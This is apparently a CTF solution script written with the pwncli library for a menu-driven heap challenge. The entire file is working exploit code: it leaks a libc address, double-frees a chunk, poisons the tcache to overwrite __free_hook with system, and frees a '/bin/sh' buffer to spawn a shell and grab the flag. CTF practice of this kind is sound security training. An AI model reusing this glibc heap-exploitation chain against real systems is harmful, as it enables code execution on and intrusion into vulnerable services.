#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def create(age, name):
    p.sendlineafter("Enter your choice: ", "0")
    p.sendlineafter("Enter age of user: ", str(age))
    p.sendafter("Enter username: ", name)


def edit(age, name):
    p.sendlineafter("Enter your choice: ", "1")
    p.sendlineafter("Enter age of user: ", str(age))
    p.sendafter("Enter username: ", name)


def dele():
    p.sendlineafter("Enter your choice: ", "2")


def send_msg(msg):
    p.sendlineafter("Enter your choice: ", "3")
    p.sendafter("Enter message to be sent: \n", msg)
    p.recvuntil("Message recieved: \n")
    m = p.recvline(False)
    info(f"Get msg: {m}")
    return m


m = send_msg("a"*0x58)
libc_base_addr = u64_ex(m[-6:]) - libc.sym['_IO_2_1_stdout_']
log_libc_base_addr(libc_base_addr)
libc.address = libc_base_addr

create(18, "deadbeef\x00")
dele()
dele()

edit(18, p64(libc.sym['__free_hook']))

send_msg("/bin/sh\x00")
send_msg(p64(libc.sym['system']))

dele()

get_flag_when_get_shell(p)

p.interactive()